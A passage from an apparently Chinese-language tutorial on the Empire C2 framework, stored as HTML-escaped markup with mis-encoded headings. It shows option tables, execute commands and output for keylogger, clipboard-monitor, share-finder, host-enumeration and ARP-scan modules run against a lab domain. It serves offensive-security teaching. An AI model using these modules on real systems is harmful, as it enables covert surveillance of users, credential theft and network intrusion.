&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”ŒRecord Optionsâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Name  â”‚ Value    â”‚ Required â”‚ Description                         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Agent â”‚ Y35E4PR8 â”‚ True     â”‚ Agent to run module on.             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Sleep â”‚ &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;        â”‚ False    â”‚ Sleep &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ms&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; between key         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚       â”‚          â”‚          â”‚ presses. Shorter &lt;span class=&#34;nb&#34;&gt;times&lt;/span&gt; may increase â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚       â”‚          â”‚          â”‚ CPU usage on the target.            â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/collection/keylogger&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;å‰ªåˆ‡æ¿è®°å½•&#34;&gt;å‰ªåˆ‡æ¿è®°å½•&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: Y35E4PR8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; usemodule powershell/collection/clipboard_monitor
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Agent to Y35E4PR8
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Author       @harmj0y                                                              
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Background   True                                                                  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Comments     http://brianreiter.org/2010/09/03/copy-and-paste-with-clipboard-from- 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              powershell/                                                           
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Description  Monitors the clipboard on a specified interval &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; changes to copied  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              text.                                                                 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Language     powershell                                                            
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Name         powershell/collection/clipboard_monitor                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; NeedsAdmin   False                                                                 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; OpsecSafe    True                                                                  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Techniques   http://attack.mitre.org/techniques/T1115                              
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              http://attack.mitre.org/techniques/T1414                              
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”ŒRecord Optionsâ”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Name            â”‚ Value    â”‚ Required â”‚ Description                         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Agent           â”‚ Y35E4PR8 â”‚ True     â”‚ Agent to run module on.             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ CollectionLimit â”‚          â”‚ False    â”‚ Specifies the interval in minutes   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                 â”‚          â”‚          â”‚ to capture clipboard text. Defaults â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                 â”‚          â”‚          â”‚ to indefinite collection.           â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ PollInterval    â”‚ &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt;       â”‚ True     â”‚ Interval &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;in seconds&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to check the  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                 â”‚          â”‚          â”‚ clipboard &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; changes, defaults to  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                 â”‚          â”‚          â”‚ &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; seconds.                         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/collection/clipboard_monitor&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;æŸ¥æ‰¾å…±äº«&#34;&gt;æŸ¥æ‰¾å…±äº«&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: Y35E4PR8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; usemodule powershell/situational_awareness/network/powerview/share_finder
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Agent to Y35E4PR8
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Author       @harmj0y                                                        
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Background   True                                                            
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Comments     https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Description  Finds shares on machines in the domain. Part of PowerView.      
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Language     powershell                                                      
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Name         powershell/situational_awareness/network/powerview/share_finder 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; NeedsAdmin   False                                                           
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; OpsecSafe    True                                                            
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Software     http://attack.mitre.org/software/S0194                          
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Techniques   http://attack.mitre.org/techniques/T1135 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/situational_awareness/network/powerview/share_finder&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked Y35E4PR8 to run Task &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Job started: EZ3W6X
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Name           Type Remark              ComputerName
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;----           ---- ------              ------------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ADMIN$   &lt;span class=&#34;m&#34;&gt;2147483648&lt;/span&gt; è¿œç¨‹ç®¡ç†                DC.hack.lab 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C$       &lt;span class=&#34;m&#34;&gt;2147483648&lt;/span&gt; é»˜è®¤å…±äº«                DC.hack.lab 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IPC$     &lt;span class=&#34;m&#34;&gt;2147483651&lt;/span&gt; è¿œç¨‹ IPC              DC.hack.lab 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;NETLOGON          &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Logon server share  DC.hack.lab 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SYSVOL            &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Logon server share  DC.hack.lab 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;æ”¶é›†ç›®æ ‡ä¸»æœºä¿¡æ¯&#34;&gt;æ”¶é›†ç›®æ ‡ä¸»æœºä¿¡æ¯&lt;/h3&gt;
&lt;p&gt;æœ‰æ—¶å€™ä¼šæœ‰å»¶è¿Ÿï¼Œç¨å¾®ç­‰ä¸€ä¸‹ä»»åŠ¡æ‰§è¡Œå®Œè¿”å›å°±è¡Œäº†&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: Y35E4PR8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; usemodule powershell/situational_awareness/host/winenum
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Agent to Y35E4PR8
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Author       @xorrior                                                        
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Background   True                                                            
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Comments     https://github.com/xorrior/RandomPS-Scripts/blob/master/Invoke- 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              WindowsEnum.ps1                                                 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Description  Collects revelant information about a host and the current user 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              context.                                                        
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Language     powershell                                                      
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Name         powershell/situational_awareness/host/winenum                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; NeedsAdmin   False                                                           
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; OpsecSafe    True                                                            
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Techniques   http://attack.mitre.org/techniques/T1082                        
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”ŒRecord Optionsâ”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Name     â”‚ Value    â”‚ Required â”‚ Description                        â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Agent    â”‚ Y35E4PR8 â”‚ True     â”‚ Agent to run module on.            â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Keywords â”‚          â”‚ False    â”‚ Array of keywords to use in file   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚          â”‚          â”‚          â”‚ searches.                          â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ UserName â”‚          â”‚ False    â”‚ UserName to enumerate. Defaults to â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚          â”‚          â”‚          â”‚ the current user context.          â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/situational_awareness/host/winenum&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked Y35E4PR8 to run Task &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Job started: XYW7T5
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;UserName: lucky
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-------------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;AD Group Memberships
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-------------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Domain Users
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Users
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Remote Desktop Users
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;arpæ‰«æ&#34;&gt;ARPæ‰«æ&lt;/h3&gt;
&lt;p&gt;åªè¦è®¾ç½®CIDRå‚æ•°å°±è¡Œäº†ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: Y35E4PR8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; usemodule powershell/situational_awareness/network/arpscan
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Agent to Y35E4PR8
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
